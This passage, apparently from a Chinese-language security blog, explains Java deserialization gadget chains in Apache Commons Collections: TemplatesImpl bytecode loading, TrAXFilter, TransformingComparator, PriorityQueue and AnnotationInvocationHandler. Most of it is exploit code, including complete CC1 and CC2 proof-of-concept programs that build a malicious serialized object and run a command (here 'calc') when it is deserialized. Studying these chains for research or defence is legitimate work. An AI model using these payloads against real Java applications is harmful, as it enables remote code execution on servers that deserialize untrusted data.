TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        …………</span><br><span class="line">            for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);  //关键点</span><br><span class="line">                final Class superClass = _class[i].getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    //继续跟进 TransletClassLoader，这个类里重写了 defineClass 方法</span><br><span class="line">    static final class TransletClassLoader extends ClassLoader &#123;</span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            super(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class defineClass(final byte[] b) &#123;</span><br><span class="line">            return defineClass(null, b, 0, b.length);   //关键点</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="TemplatesImpl-newTransformer-rce-前TrAXFilter-InvokerTransformer-transform"><a href="#TemplatesImpl-newTransformer-rce-前TrAXFilter-InvokerTransformer-transform" class="headerlink" title="TemplatesImpl.newTransformer() rce   前TrAXFilter|InvokerTransformer.transform()"></a>TemplatesImpl.newTransformer() rce   前TrAXFilter|InvokerTransformer.transform()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.decode(&quot;&quot;); # code可以从下面注意事项或上面通用方法获得</span><br><span class="line"></span><br><span class="line">//反射设置 Field</span><br><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</span><br><span class="line">setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);</span><br><span class="line">setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>
<h5 id="这里有有一点需要注意，-HelloTemplatesImpl-java，主要其必须继承-AbstractTranslet-类-why"><a href="#这里有有一点需要注意，-HelloTemplatesImpl-java，主要其必须继承-AbstractTranslet-类-why" class="headerlink" title="这里有有一点需要注意， HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类. why?????"></a>这里有有一点需要注意， HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类. why?????</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// HelloTemplatesImpl.java</span><br><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    public HelloTemplatesImpl() &#123;</span><br><span class="line">        super();</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TrAXFilter-后newTransformer"><a href="#TrAXFilter-后newTransformer" class="headerlink" title="TrAXFilter  后newTransformer()"></a>TrAXFilter  后newTransformer()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class TrAXFilter extends XMLFilterImpl &#123;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public TrAXFilter(Templates templates)  throws</span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();    //关键点</span><br><span class="line">        …………</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="如何调用TrAXFilter-有CC时可"><a href="#如何调用TrAXFilter-有CC时可" class="headerlink" title="如何调用TrAXFilter  有CC时可"></a>如何调用TrAXFilter  有CC时可</h4><p>演示代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;); </span><br><span class="line"># templates 可以在newTransformer()处找到代码</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure>
<p>实际调用时候 需要被封到 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//Transformer数组</span><br><span class="line">Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">        new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
<h3 id="TransformingComparator-前PriorityQueue-后-transformer-transform-即CC"><a href="#TransformingComparator-前PriorityQueue-后-transformer-transform-即CC" class="headerlink" title="TransformingComparator  前PriorityQueue.  后   transformer.transform() 即CC"></a>TransformingComparator  前PriorityQueue.  后   transformer.transform() 即CC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 3456940356043606220L;</span><br><span class="line">    private final Comparator&lt;O&gt; decorated;</span><br><span class="line">    private final Transformer&lt;? super I, ? extends O&gt; transformer;</span><br><span class="line"></span><br><span class="line">    public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123;</span><br><span class="line">        this(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int compare(I obj1, I obj2) &#123;</span><br><span class="line">        //关键点</span><br><span class="line">        O value1 = this.transformer.transform(obj1);</span><br><span class="line">        O value2 = this.transformer.transform(obj2);</span><br><span class="line">        return this.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//为了执行 templates.newTransformer</span><br><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">//TransformingComparator 实例</span><br><span class="line">TransformingComparator comparator = new TransformingComparator(invokerTransformer);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="PriorityQueue-source-后-Comparator-compare-即TransformingComparator-compare"><a href="#PriorityQueue-source-后-Comparator-compare-即TransformingComparator-compare" class="headerlink" title="PriorityQueue  source. 后 Comparator.compare  即TransformingComparator.compare()"></a>PriorityQueue  source. 后 Comparator.compare  即TransformingComparator.compare()</h3><p>其反序列化时调用 readObject 方法，然后最终会调用 我们自定义的 Comparator 的 compare 方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123;</span><br><span class="line">    private transient Object[] queue;   //关键点，可以传入 TemplatesImpl</span><br><span class="line">    private final Comparator&lt;? super E&gt; comparator;     //关键点可以反射设置我们自己的 Comparator</span><br><span class="line"></span><br><span class="line">    //关键点，反序列化时字段执行的 readObject</span><br><span class="line">    private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        //关键点，调用 heapify() 排序</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 heapify() 方法</span><br><span class="line">    private void heapify() &#123;</span><br><span class="line">        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator</span><br><span class="line">    private void siftDown(int k, E x) &#123;</span><br><span class="line">        if (comparator != null)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        else</span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 siftDownUsingComparator 方法，可以看到这里调用了我们自定义的 Comparator</span><br><span class="line">    private void siftDownUsingComparator(int k, E x) &#123;</span><br><span class="line">        int half = size &gt;&gt;&gt; 1;</span><br><span class="line">        while (k &lt; half) &#123;</span><br><span class="line">            int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">            Object c = queue[child];</span><br><span class="line">            int right = child + 1;</span><br><span class="line">            if (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; 0)    //关键点</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">                break;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//PriorityQueue 实例</span><br><span class="line">PriorityQueue priorityQueue = new PriorityQueue(2);</span><br><span class="line">//先设置为正常变量值，后面可以通过setFieldValue修改</span><br><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(1);</span><br><span class="line"></span><br><span class="line">//反射设置 Field</span><br><span class="line">Object[] objects = new Object[]&#123;templates, templates&#125;;  //templates是TemplatesImpl 实例</span><br><span class="line">setFieldValue(priorityQueue, &quot;queue&quot;, objects); //comparator是TransformingComparator  实例，这个实例调用newTransformer</span><br><span class="line">setFieldValue(priorityQueue, &quot;comparator&quot;, comparator);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="AnnotationInvocationHandler-原生类-后LazyMap-get"><a href="#AnnotationInvocationHandler-原生类-后LazyMap-get" class="headerlink" title="AnnotationInvocationHandler  原生类  后LazyMap.get()"></a>AnnotationInvocationHandler  原生类  后LazyMap.get()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private final Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    //构造函数，可传入 LazyMap</span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //利用 invoke 方法可实现调用 LazyMap#get</span><br><span class="line">    public Object invoke(Object var1, Method var2, Object[] var3) &#123;</span><br><span class="line">        Object var6 = this.memberValues.get(var4);</span><br><span class="line">    &#125;</span><br><span class="line">    # AnnotationInvocationHandler 类 readObject 方法代码：关键点在 this.memberValues.entrySet() ，这里我们可以为 memberValues 传入一个代理对象。通过 java 的动态代理机制，使其最终触发 AnnotationInvocationHandler 类的 invoke 方法，从而实现触发 LazyMap.get()。 </span><br><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="AnnotationInvocationHandler的constructor-后LazyMap-get-可参照微调成其他类的get"><a href="#AnnotationInvocationHandler的constructor-后LazyMap-get-可参照微调成其他类的get" class="headerlink" title="AnnotationInvocationHandler的constructor    后LazyMap.get()   可参照微调成其他类的get();"></a>AnnotationInvocationHandler的constructor    后LazyMap.get()   可参照微调成其他类的get();</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//反射获取AnnotationInvocationHandler实例  为什么要用反射  因为没有写明public之类的声明，所以说明这个类只能在sun.reflect.annotation这个本包下被调用，我们要想在外部调用，需要用到反射来解决</span><br><span class="line">Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(true);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">//动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke           </span><br><span class="line">Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="动态代理可以调用任意get方法-具体看7u21"><a href="#动态代理可以调用任意get方法-具体看7u21" class="headerlink" title="动态代理可以调用任意get方法  具体看7u21"></a>动态代理可以调用任意get方法  具体看7u21</h4><pre><code>    public Object invoke(Object var1, Method var2, Object[] var3) &#123;
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;
            return this.equalsImpl(var3[0]);

    //再跟进这个equalsImpl()方法：

    private Boolean equalsImpl(Object var1) &#123;
        if (var1 == this) &#123;
            return true;
        &#125; else if (!this.type.isInstance(var1)) &#123;
            return false;
        &#125; else &#123;
            Method[] var2 = this.getMemberMethods();
            int var3 = var2.length;

            for(int var4 = 0; var4 &lt; var3; ++var4) &#123;
                Method var5 = var2[var4];
                String var6 = var5.getName();
                Object var7 = this.memberValues.get(var6);
                Object var8 = null;
                AnnotationInvocationHandler var9 = this.asOneOfUs(var1);
                if (var9 != null) &#123;
                    var8 = var9.memberValues.get(var6);
                &#125; else &#123;
                    try &#123;
                        var8 = var5.invoke(var1);
                    &#125; catch (InvocationTargetException var11) &#123;
                        return false;
                    &#125; catch (IllegalAccessException var12) &#123;
                        throw new AssertionError(var12);
                    &#125;
                &#125;

                if (!memberValueEquals(var7, var8)) &#123;
                    return false;
                &#125;
            &#125;

            return true;
        &#125;
    &#125;
    //前两个if不用管，直接看else。通过getMemberMethods得到一个Method[]：

    private Method[] getMemberMethods() &#123;
        if (this.memberMethods == null) &#123;
            this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;
                public Method[] run() &#123;
                    Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                    AccessibleObject.setAccessible(var1, true);
                    return var1;
                &#125;
            &#125;);
        &#125;

        return this.memberMethods;
        //然后进入for循环，遍历这个Method[]，然后调用方法：

        //        if (var9 != null) &#123;
        //            var8 = var9.memberValues.get(var6);
        //这里的Method[]只能是通过this.type来得到：
        //AnnotationInvocationHandler.this.type.getDeclaredMethods();
        //因为memberMethods属性是个瞬态属性不可控。

        //private transient volatile Method[] memberMethods = null;
        ///因此总的来说可以利用的就是，得到this.type的所有Method[]，然后依次调用所有。如果让this.type是TemplatesImpl的类的话，就自然会调用到newTransformer或者getOutputProperties。
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 成熟链</span><br><span class="line">### CC1   8u65  3.2.1 可用  1.8 8u71版本以后，对AnnotationInvocationHandler的readobject进行了改写。导致高版本中利用链无法使用。CC1在commons-collections-4.0可用</span><br><span class="line">https://xz.aliyun.com/t/12669?time__1311=GqGxuDRiD%3Dit%3DGN4eeqBKWu4fO6iKFoa4D#toc-4  perfect</span><br><span class="line"></span><br><span class="line">https://xz.aliyun.com/t/9409?time__1311=n4%2BxnD0Du0eGwwDBqooGkDRDRg4fx200our2bD#toc-0这个踩坑，里面CC1不对</span><br></pre></td></tr></table></figure>
-&gt;AnnotationInvocationHandler.readObject()
      -&gt;mapProxy.entrySet().iterator()  //动态代理类
          -&gt;AnnotationInvocationHandler.invoke()
            -&gt;LazyMap.get()
                -&gt;ChainedTransformer.transform()
                -&gt;ConstantTransformer.transform()
                    -&gt;InvokerTransformer.transform()
                    -&gt;…………
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">####完整代码</span><br></pre></td></tr></table></figure>
public static void main(String[] args) throws Exception &#123;
        Class rc=Class.*forName*(&quot;java.lang.Runtime&quot;);
        Transformer[] Transformers=new Transformer[]&#123;
                new ConstantTransformer(Runtime.class), //添加此行代码，这里解决问题三
                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);
    //上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。

        HashMap&lt;Object,Object&gt; map=new HashMap&lt;&gt;();
        map.put(&quot;value&quot;,&quot;gxngxngxn&quot;); //这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断
        Map&lt;Object,Object&gt; transformedmap=TransformedMap.*decorate*(map,null,chainedTransformer);
        Class c=Class.*forName*(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object o=constructor.newInstance(Target.class,transformedmap); //这里是问题二中第一个参数改注解为Target
        *serialize*(o);
        *unserialize*(&quot;C://java/CC1.txt&quot;);
    &#125;
    public static void serialize(Object object) throws Exception&#123;
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;C://java/CC1.txt&quot;));
        oos.writeObject(object);
    &#125;
    public static void unserialize(String filename) throws Exception&#123;
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    &#125;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### CC2 commons-collections-4.0</span><br></pre></td></tr></table></figure>
Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
                ...
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">public class cc2 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();//返回默认的类池</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径</span><br><span class="line">        CtClass payload=classPool.makeClass(&quot;CommonsCollections22222222222&quot;);//创建一个新的public类</span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span><br><span class="line">        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，设置构造函数主体为runtime</span><br><span class="line"></span><br><span class="line">        byte[] bytes=payload.toBytecode();//转换为byte数组</span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();//反射创建TemplatesImpl</span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段</span><br><span class="line">        field.setAccessible(true);//暴力反射</span><br><span class="line">        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);//反射获取templatesImpl的_name字段</span><br><span class="line">        field1.setAccessible(true);//暴力反射</span><br><span class="line">        field1.set(templatesImpl,&quot;test&quot;);//将templatesImpl上的_name字段设置为test</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象</span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span><br><span class="line">        queue.add(1);//添加数字1插入此优先级队列</span><br><span class="line">        queue.add(1);//添加数字1插入此优先级队列</span><br><span class="line"></span><br><span class="line">        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);//获取PriorityQueue的comparator字段</span><br><span class="line">        field2.setAccessible(true);//暴力反射</span><br><span class="line">        field2.set(queue,comparator);//设置queue的comparator字段值为comparator</span><br><span class="line"></span><br><span class="line">        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);//获取queue的queue字段</span><br><span class="line">        field3.setAccessible(true);//暴力反射</span><br><span class="line">        field3.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125;);//设置queue的queue字段内容Object数组，内容为templatesImpl</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
### CC3 jdk7u21 3.1-3.2.1

对 CC1 进行了一些修改。引入了 TemplatesImpl 来加载字节码，去掉了 InvokerTransformer ，引入了 InstantiateTransformer。TemplatesImpl、InstantiateTransformer、TrAXFilter 上面1.6已经介绍了，这里不再赘述。如何通过 AnnotationInvocationHandler.readObject() 来触发 LazyMap.get() 也与上面的 CC1 一致。

